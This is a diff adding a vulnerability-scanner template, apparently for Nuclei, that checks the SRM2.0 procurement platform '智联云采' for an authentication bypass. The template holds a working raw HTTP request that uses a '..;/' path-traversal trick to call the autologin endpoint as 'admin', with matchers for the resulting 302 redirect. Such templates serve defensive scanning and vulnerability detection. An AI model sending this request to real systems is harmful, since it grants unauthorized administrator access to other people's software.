@@ -1,0 +1,28 @@
+id: zhilianyuncai-autologin-Authentication-bypass
+
+info:
+  name: 智联云采 SRM2.0 autologin  身份认证绕过漏洞
+  author: zhilianyuncai
+  severity: high
+  tags: Authentication bypass
+  
+
+http:
+  - raw:
+      - |
+        GET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+        - "Location: /adpweb/a;"
+      - type: status
+        status: 
+        - 302
+
+
+
+
